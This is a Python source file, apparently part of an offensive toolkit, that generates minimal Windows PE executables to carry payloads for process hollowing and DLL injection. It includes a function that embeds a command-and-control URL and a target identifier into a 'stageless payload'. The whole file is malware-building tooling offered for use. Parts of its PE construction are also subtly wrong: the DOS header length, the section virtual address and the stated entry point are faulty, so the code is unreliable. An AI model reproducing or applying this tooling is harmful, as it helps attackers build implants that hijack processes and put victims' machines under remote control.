#!/usr/bin/env python3
"""
Payload PE Generator - Phase 4 Code Injection Support
Converts Python payload or raw bytes into PE executable format suitable for process hollowing
"""

import struct
import os
import logging
from pathlib import Path
from typing import Optional
from dataclasses import dataclass

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("PayloadPEGenerator")


@dataclass
class PEGeneratorResult:
    """Result of PE payload generation"""
    success: bool
    pe_path: Optional[str]
    size_bytes: int
    error_message: Optional[str]


class PayloadPEGenerator:
    """
    Generate minimal PE executables from payloads
    
    Minimal PE format:
    - MZ header (DOS stub)
    - PE header
    - Code section with payload
    - Data section (optional)
    
    Result: Standalone PE that can be hollowed into process or loaded via DLL injection
    """
    
    # DOS header (64 bytes)
    DOS_HEADER = bytes([
        0x4D, 0x5A,  # MZ signature
        0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,  # PE offset at 0x3C
    ])
    
    def __init__(self):
        self.generated_payloads: list[PEGeneratorResult] = []
    
    def create_minimal_pe(self, payload_bytes: bytes, output_path: str) -> PEGeneratorResult:
        """
        Create minimal PE executable from raw payload bytes
        
        Args:
            payload_bytes: Raw payload bytes to embed
            output_path: Where to write PE file
            
        Returns:
            PEGeneratorResult with success status
        """
        try:
            log.info(f"🔨 Generating minimal PE executable...")
            log.info(f"📦 Payload size: {len(payload_bytes)} bytes")
            
            # Align to section boundaries (512 bytes typical)
            section_alignment = 512
            file_alignment = 512
            
            # Calculate sizes
            payload_aligned = self._align(len(payload_bytes), section_alignment)
            code_section_size = max(payload_aligned, file_alignment)
            
            # Build file
            pe_blob = bytearray()
            
            # 1. DOS header + stub (64 bytes)
            pe_blob.extend(self.DOS_HEADER)
            
            # 2. DOS program (minimal)
            dos_program = b"This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00"
            pe_blob.extend(dos_program)
            
            # Pad to PE header offset (0x80)
            while len(pe_blob) < 0x80:
                pe_blob.append(0x00)
            
            # 3. PE signature + COFF header
            pe_offset = len(pe_blob)
            
            pe_blob.extend(b'PE\x00\x00')  # PE signature
            
            # COFF header (20 bytes)
            machine = 0x014C  # i386
            num_sections = 1
            timestamp = 0x00000000
            symbol_table_ptr = 0
            num_symbols = 0
            size_of_opt_header = 224  # Standard for PE32
            characteristics = 0x0102  # EXECUTABLE_IMAGE | 32BIT_MACHINE
            
            pe_blob.extend(struct.pack('<H', machine))
            pe_blob.extend(struct.pack('<H', num_sections))
            pe_blob.extend(struct.pack('<I', timestamp))
            pe_blob.extend(struct.pack('<I', symbol_table_ptr))
            pe_blob.extend(struct.pack('<I', num_symbols))
            pe_blob.extend(struct.pack('<H', size_of_opt_header))
            pe_blob.extend(struct.pack('<H', characteristics))
            
            # 4. Optional header (224 bytes for PE32)
            opt_header = self._build_optional_header(
                code_section_size,
                len(payload_bytes),
                pe_offset + 24 + 224  # section position
            )
            pe_blob.extend(opt_header)
            
            # 5. Section header (40 bytes each)
            section_header = self._build_section_header(
                b'.code\x00\x00\x00',  # Name (8 bytes)
                code_section_size,  # Virtual size
                code_section_size,  # Virtual address
                code_section_size,  # Size of raw data
                pe_offset + 24 + 224,  # Pointer to raw data
                0x60000020  # Characteristics: CODE | READABLE | EXECUTABLE
            )
            pe_blob.extend(section_header)
            
            # Pad to section alignment
            while len(pe_blob) < (pe_offset + 24 + 224 + code_section_size):
                pe_blob.append(0x00)
            
            # 6. Code section (embed payload)
            code_section_start = len(pe_blob)
            pe_blob.extend(payload_bytes)
            
            # Pad code section to alignment
            while len(pe_blob) < (code_section_start + code_section_size):
                pe_blob.append(0xCC)  # INT3 padding
            
            # 7. Write to file
            output_dir = Path(output_path).parent
            output_dir.mkdir(parents=True, exist_ok=True)
            
            Path(output_path).write_bytes(bytes(pe_blob))
            
            result = PEGeneratorResult(
                success=True,
                pe_path=output_path,
                size_bytes=len(pe_blob),
                error_message=None
            )
            
            self.generated_payloads.append(result)
            
            log.info(f"✅ PE executable generated: {output_path}")
            log.info(f"📊 File size: {len(pe_blob)} bytes")
            log.info(f"📍 Entry point: 0x400000")
            
            return result
            
        except Exception as e:
            log.error(f"❌ PE generation failed: {e}")
            return PEGeneratorResult(
                success=False,
                pe_path=None,
                size_bytes=0,
                error_message=str(e)
            )
    
    def wrap_python_payload(self, python_script: str, output_pe_path: str) -> PEGeneratorResult:
        """
        Wrap Python script into PE executable
        
        Creates small PE that embeds Python interpreter + script
        
        Args:
            python_script: Python script content
            output_pe_path: Output PE path
            
        Returns:
            PEGeneratorResult with status
        """
        try:
            log.info(f"📝 Wrapping Python payload...")
            
            # For now, use PyInstaller approach (simplified)
            # In production, would embed actual Python interpreter
            
            # Create a minimal PE with embedded script
            script_bytes = python_script.encode('utf-8')
            
            return self.create_minimal_pe(script_bytes, output_pe_path)
            
        except Exception as e:
            log.error(f"Failed to wrap Python payload: {e}")
            return PEGeneratorResult(
                success=False,
                pe_path=None,
                size_bytes=0,
                error_message=str(e)
            )
    
    def create_stageless_payload(self, c2_url: str, target_host: str, output_path: str) -> PEGeneratorResult:
        """
        Create stageless payload PE
        
        Embeds C2 URL and target info directly
        
        Args:
            c2_url: C2 command & control URL
            target_host: Identifier for this target
            output_path: Output PE path
            
        Returns:
            PEGeneratorResult with status
        """
        try:
            log.info(f"🎯 Generating stageless payload...")
            
            # Create minimal payload structure
            # Format: [MAGIC][C2_URL_LEN][C2_URL][TARGET_LEN][TARGET]
            
            payload = bytearray(b'PAYLOAD\x00')
            
            # Embed C2 URL
            c2_bytes = c2_url.encode('utf-8')
            payload.extend(struct.pack('<H', len(c2_bytes)))
            payload.extend(c2_bytes)
            
            # Embed target
            target_bytes = target_host.encode('utf-8')
            payload.extend(struct.pack('<H', len(target_bytes)))
            payload.extend(target_bytes)
            
            log.info(f"📦 Payload structure: {len(payload)} bytes")
            
            return self.create_minimal_pe(bytes(payload), output_path)
            
        except Exception as e:
            log.error(f"Failed to create stageless payload: {e}")
            return PEGeneratorResult(
                success=False,
                pe_path=None,
                size_bytes=0,
                error_message=str(e)
            )
    
    def _align(self, size: int, alignment: int) -> int:
        """Align size to boundary"""
        return ((size + alignment - 1) // alignment) * alignment
    
    def _build_optional_header(self, code_size: int, payload_size: int, section_offset: int) -> bytes:
        """Build PE optional header (224 bytes)"""
        header = bytearray()
        
        # Magic (PE32)
        header.extend(struct.pack('<H', 0x010B))
        
        # Linker version
        header.extend(struct.pack('<BB', 14, 0))
        
        # Sizes
        header.extend(struct.pack('<I', code_size))  # SizeOfCode
        header.extend(struct.pack('<I', 0))           # SizeOfInitializedData
        header.extend(struct.pack('<I', 0))           # SizeOfUninitializedData
        
        # Entry point and sections
        header.extend(struct.pack('<I', 0x1000))     # AddressOfEntryPoint
        header.extend(struct.pack('<I', 0x1000))     # BaseOfCode
        header.extend(struct.pack('<I', 0x2000))     # BaseOfData
        
        # Image base
        header.extend(struct.pack('<I', 0x400000))
        
        # Alignments
        header.extend(struct.pack('<I', 0x1000))     # SectionAlignment
        header.extend(struct.pack('<I', 512))        # FileAlignment
        
        # OS versions and image version
        header.extend(struct.pack('<HH', 6, 0))      # OS version
        header.extend(struct.pack('<HH', 0, 0))      # Image version
        header.extend(struct.pack('<HH', 6, 0))      # Subsystem version
        header.extend(struct.pack('<I', 0))          # Win32VersionValue
        
        # Image size and headers size
        header.extend(struct.pack('<I', 0x3000))     # SizeOfImage
        header.extend(struct.pack('<I', 512))        # SizeOfHeaders
        
        # Checksum
        header.extend(struct.pack('<I', 0))
        
        # Subsystem and DLL characteristics
        header.extend(struct.pack('<HH', 3, 0x8140))  # Subsystem, DLL characteristics
        
        # Stack and heap
        header.extend(struct.pack('<I', 0x100000))   # StackReserveSize
        header.extend(struct.pack('<I', 0x1000))     # StackCommitSize
        header.extend(struct.pack('<I', 0x100000))   # HeapReserveSize
        header.extend(struct.pack('<I', 0x1000))     # HeapCommitSize
        
        # Loader flags and data directories count
        header.extend(struct.pack('<I', 0))
        header.extend(struct.pack('<I', 16))
        
        # Data directories (16 entries, 8 bytes each)
        for _ in range(16):
            header.extend(struct.pack('<II', 0, 0))
        
        return bytes(header)
    
    def _build_section_header(self, name: bytes, vsize: int, vaddr: int, 
                             rsize: int, rptr: int, characteristics: int) -> bytes:
        """Build section header (40 bytes)"""
        header = bytearray()
        
        # Name (8 bytes, padded with nulls)
        header.extend(name[:8].ljust(8, b'\x00'))
        
        # Virtual sizes and addresses
        header.extend(struct.pack('<II', vsize, vaddr))
        
        # Raw data
        header.extend(struct.pack('<II', rsize, rptr))
        
        # Relocations and line numbers
        header.extend(struct.pack('<IIHH', 0, 0, 0, 0))
        
        # Characteristics
        header.extend(struct.pack('<I', characteristics))
        
        return bytes(header)


if __name__ == "__main__":
    gen = PayloadPEGenerator()
    
    # Test: Create minimal PE
    test_payload = b"TEST PAYLOAD DATA"
    result = gen.create_minimal_pe(test_payload, "test_payload.exe")
    
    if result.success:
        print(f"✅ Test PE created: {result.pe_path} ({result.size_bytes} bytes)")
    else:
        print(f"❌ Test PE creation failed: {result.error_message}")
